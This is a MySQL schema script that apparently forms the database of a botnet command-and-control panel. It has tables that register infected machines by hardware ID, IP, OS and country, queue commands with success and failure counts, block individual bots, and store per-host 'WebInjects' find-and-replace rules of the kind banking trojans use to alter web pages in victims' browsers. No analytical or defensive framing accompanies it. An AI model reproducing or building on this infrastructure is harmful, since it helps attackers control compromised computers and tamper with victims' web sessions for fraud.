DROP TABLE IF EXISTS `users`;
DROP TABLE IF EXISTS `bots`;
DROP TABLE IF EXISTS `tasks`;
DROP TABLE IF EXISTS `complete_tasks`;
DROP TABLE IF EXISTS `blocked`;
DROP TABLE IF EXISTS `WebInjects`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=2;
CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `HWID` varchar(100) NOT NULL,
  `env` varchar(100) NOT NULL,
  `sys` varchar(100) NOT NULL,
  `IP` varchar(100) NOT NULL,
  `OS` varchar(100) NOT NULL,
  `country` varchar(100) NOT NULL,
  `last_seen` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=2;
CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cmd_num` varchar(255) NOT NULL,
  `cmd` varchar(255) DEFAULT NULL,
  `executed` int(10) DEFAULT '0',
  `failed` int(10) DEFAULT '0',
  `maxbots` int(10) DEFAULT '0',
  `time_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` int(10) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
CREATE TABLE IF NOT EXISTS `complete_tasks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cmd` varchar(255) NOT NULL,
  `result` int(10) NOT NULL,
  `botid` varchar(255) NOT NULL,
  `time_executed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
CREATE TABLE IF NOT EXISTS `blocked` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hwid` varchar(255) NOT NULL,
  `time_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
CREATE TABLE IF NOT EXISTS `WebInjects` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `host` varchar(255) NOT NULL,
  `find` varchar(255) NOT NULL,
  `replace` varchar(255) NOT NULL,
  `status` varchar(255) NOT NULL,
  `time_executed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;